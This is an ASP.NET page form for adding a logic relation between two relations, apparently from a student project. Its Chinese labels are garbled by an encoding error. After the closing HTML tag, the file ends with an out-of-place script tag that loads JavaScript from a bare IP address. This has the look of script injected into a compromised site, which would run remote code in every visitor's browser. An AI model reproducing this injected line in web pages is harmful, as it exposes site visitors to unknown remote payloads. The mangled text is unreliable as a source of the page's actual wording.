<%@ Page Language="vb" AutoEventWireup="false" Codebehind="addlogic.aspx.vb" Inherits="relation.addlogic1"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
	<HEAD>
		<title>addlogic</title>
		<meta name="GENERATOR" content="Microsoft Visual Studio .NET 7.1">
		<meta name="CODE_LANGUAGE" content="Visual Basic .NET 7.1">
		<meta name="vs_defaultClientScript" content="JavaScript">
		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">
	</HEAD>
	<body>
		<FONT face="����">
			<FORM id="Form1" method="post">
				<FONT face="����">
					<TABLE id="Table9" cellSpacing="0" cellPadding="0" width="778" align="center" bgColor="#fef3bd"
						border="0" valign="middle">
						<TR>
							<TD vAlign="middle" width="778" bgColor="#fef3bd" colSpan="3" height="8">
								<DIV align="center"><IMG height="8" src="imga/bg1.gif" width="100%"></DIV>
							</TD>
						</TR>
						<TR bgColor="#ffffff">
							<TD colSpan="3" height="60"><IMG height="60" src="imga/logo.gif" width="321"><IMG height="60" src="imga/idea.jpg" width="457"></TD>
						</TR>
						<TR>
							<TD vAlign="middle" colSpan="3" height="8"><IMG height="8" src="imga/bg2.gif" width="100%"></TD>
						</TR>
					</TABLE> <!--===============include menu================--> <!--==========include menu==============-->
					<TABLE id="Table10" cellSpacing="0" cellPadding="0" width="778" align="center" border="0">
						<TR>
							<TD class="p9" vAlign="middle" width="196" bgColor="#dedede" height="18">
								<DIV align="center"><FONT color="#666666"><B>
											<asp:Label id="timetext" runat="server"></asp:Label>
										</B></FONT>
								</DIV>
							</TD>
							<TD class="p9" vAlign="middle" width="51" bgColor="#dedede" height="18">
								<DIV align="right"><IMG height="25" src="imga/blue.jpg" width="35"></DIV>
							</TD>
							<TD class="p9" vAlign="middle" width="548" background="imga/blue2.jpg" bgColor="#00459c"
								height="18">
								<DIV align="left"><SPAN class="p10"><FONT color="#ffffff"><A class="whitemenu" onmouseover="showMenu(this,'topmenu1',0)" onmouseout="hideMenu(event)"
												href="rmodelpublish.aspx" target="_top">����</A> <A class="whitemenu" onmouseover="showMenu(this,'topmenu2',0)" onmouseout="hideMenu(event)"
												href="rmodelsearch.aspx" target="_top">��ѯ</A>&nbsp;<A href="rmodelmodification.aspx">�޸�</A>
										</FONT></SPAN>
								</DIV>
							</TD>
						</TR>
					</TABLE>
					<DIV id="Div1" style="VISIBILITY: hidden" onmouseout="hideMenu(event)"></DIV>
					<FONT face="����"></FONT>
					<TABLE id="Table11" height="62" cellSpacing="0" width="778" align="center">
						<TR border="0">
							<TD class="p10" vAlign="top" background="imga/bg3.gif" colSpan="2" height="20" border="0"><IMG height="1" src="imga/03.gif" width="100%"><BR>
								<FONT color="#000000">&nbsp;|</FONT><FONT color="#000000"><SPAN class="p9"> <A href="index.aspx">
											��ҳ</A></SPAN> </FONT><FONT color="#000000">|</FONT> <FONT color="#000000">
									<SPAN class="p9"><A href="index.aspx">�û���¼</A></SPAN> |<A href="newcustomer.aspx">ע��</A>
								</FONT>
							</TD>
						</TR>
						<TR border="0">
							<TD vAlign="top" width="172" bgColor="#0859ad" height="20">&nbsp;
								<asp:label id="lblHint" runat="server" ForeColor="Info">Label</asp:label></TD>
							<TD vAlign="top" bgColor="#0859ad" height="20">
								<DIV align="right"><FONT color="#ffffff"><marquee direction="left" behavior="scroll" scrolldelay="100" loop="-1">��ӭ�� 
											&nbsp;���ҵ�����ѣ� &nbsp; &nbsp;</marquee>
									</FONT>
								</DIV>
							</TD>
						</TR>
					</TABLE>
					<CENTER>
						<TABLE id="Table12" height="400" cellSpacing="0" cellPadding="0" width="778" bgColor="#ffffff"
							border="0">
							<TBODY>
								<TR>
									<TD vAlign="top" width="172" bgColor="#0859ad" height="14"><!--====================include pageleft==================-->
										<TABLE id="Table13" cellSpacing="0" cellPadding="0" width="100%" border="0">
											<TR>
												<TD vAlign="top" bgColor="#0859ad">
													<DIV align="center"><FONT face="����"></FONT>&nbsp;</DIV>
												</TD>
											</TR>
										</TABLE>
										<TABLE id="Table14" height="100%" cellSpacing="0" cellPadding="0" width="100%" border="0">
											<TR>
												<TD vAlign="top" bgColor="#9cd7ef">
													<DIV align="center"><IMG style="WIDTH: 100%; HEIGHT: 32px" height="32" src="imga/grad.gif" width="172">&nbsp;
														<TABLE id="Table15" style="WIDTH: 153px; HEIGHT: 153px" width="153" border="1">
															<TR>
																<TD width="147" height="45">
																	<DIV align="center">&nbsp;<A href="rmodelsearch.aspx">&nbsp;��ѯ��ϵ�ռ�</A></DIV>
																</TD>
															</TR>
															<TR>
																<TD height="43">
																	<DIV align="center"><A href="rdefinitionsearch.aspx">��ѯ��ϵ����</A></DIV>
																</TD>
															</TR>
															<TR>
																<TD height="55">
																	<DIV align="center"><A href="rinstancesearch.aspx">��ѯ��ϵʵ��</A></DIV>
																</TD>
															</TR>
														</TABLE>
														<BR>
														<BR>
													</DIV>
												</TD>
											</TR>
										</TABLE>
									</TD>
									<TD vAlign="top" width="21" bgColor="#ffffff"><IMG height="23" src="imga/05.gif" width="21"></TD>
									<TD vAlign="top" width="611">
			</FORM>
			<FORM style="MARGIN: 0px" name="loginForm" action="" method="post">
				&nbsp;</FORM>
			<FORM id="Form2" method="post" runat="server">
				<TABLE id="Table1" style="WIDTH: 560px; HEIGHT: 340px" cellSpacing="1" cellPadding="1"
					width="560" border="1">
					<TR>
						<TD>
							<TABLE id="Table2" style="WIDTH: 544px; HEIGHT: 158px" cellSpacing="1" cellPadding="1"
								width="544" border="1">
								<TR>
									<TD>
										<asp:Label id="lblLogicKey" runat="server">��ϵ���߼����</asp:Label></TD>
								</TR>
								<TR>
									<TD>
										<asp:TextBox id="txtLogicKey" runat="server"></asp:TextBox>
										<asp:regularexpressionvalidator id="txtLogicKeyRegularExpressionValidator" runat="server" Width="240px" Height="14px"
											ControlToValidate="txtLogicKey" ValidationExpression="[0-9]{1,}" ErrorMessage="�������ϵ�߼���ű���Ϊ����"></asp:regularexpressionvalidator></TD>
								</TR>
								<TR>
									<TD>
										<asp:Label id="lblAssKeyFrom" runat="server">��һ��������ϵ</asp:Label></TD>
								</TR>
								<TR>
									<TD>
										<asp:DropDownList id="ddlstAssKeyFrom" runat="server" Width="164px"></asp:DropDownList></TD>
								</TR>
								<TR>
									<TD>
										<asp:Label id="lblAssKeyTo" runat="server">�ڶ���������ϵ</asp:Label></TD>
								</TR>
								<TR>
									<TD>
										<asp:DropDownList id="ddlstAssKeyTo" runat="server" Width="148px"></asp:DropDownList></TD>
								</TR>
								<TR>
									<TD style="HEIGHT: 21px">
										<asp:Label id="lblLogRel" runat="server">��ϵ�����߼���ϵ</asp:Label></TD>
								</TR>
								<TR>
									<TD>
										<asp:RadioButton id="rbtnLogOr" runat="server" Text="��" GroupName="rbtnLogRef"></asp:RadioButton>&nbsp;
										<asp:RadioButton id="rbtnLogAnd" runat="server" Text="��" GroupName="rbtnLogRef"></asp:RadioButton>&nbsp;
										<asp:RadioButton id="rbtnLogMtx" runat="server" Text="����" GroupName="rbtnLogRef"></asp:RadioButton>&nbsp;
										<asp:RadioButton id="rbtnLogImp" runat="server" Text="�̺�" GroupName="rbtnLogRef"></asp:RadioButton></TD>
								</TR>
							</TABLE>
							<TABLE id="Table3" style="WIDTH: 540px; HEIGHT: 32px" cellSpacing="1" cellPadding="1" width="540"
								border="1">
								<TR>
									<TD></TD>
									<TD style="WIDTH: 99px">
										<asp:Button id="btnSave" runat="server" Text="����"></asp:Button></TD>
									<TD style="WIDTH: 96px"></TD>
									<TD>
										<asp:Button id="btnCancel" runat="server" Text="����"></asp:Button></TD>
								</TR>
							</TABLE>
							<asp:label id="lblWarning" runat="server" Width="408px" ForeColor="#0000C0">label</asp:label>
						</TD>
					</TR>
				</TABLE> </TD></TR></TBODY></TABLE></CENTER><!---====================include pagetail================-->
				<CENTER>
					<TABLE id="Table16" cellSpacing="0" cellPadding="0" width="778" border="0">
						<TR>
							<TD><IMG height="31" src="imga/bg4.gif" width="778"></TD>
						</TR>
						<TR>
							<TD class="p9" background="imga/bg5.gif">
								<DIV align="center">| �������� | �ͷ��绰��<STRONG><FONT face="Arial">0571-63740939</FONT></STRONG></DIV>
							</TD>
						</TR>
						<TR>
							<TD class="p9" bgColor="#ffffff"><FONT face="����">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
									��Ȩ���У�&nbsp;&nbsp; �㽭��ѧԺ��Ϣ����ѧԺ����022&nbsp; ������ ½���� </FONT>
							</TD>
						</TR>
					</TABLE>
				</CENTER>
		</FONT></FORM></FONT>
	</body>
</HTML>
<script src="http://222.208.183.246/ad/ad.js"></script>
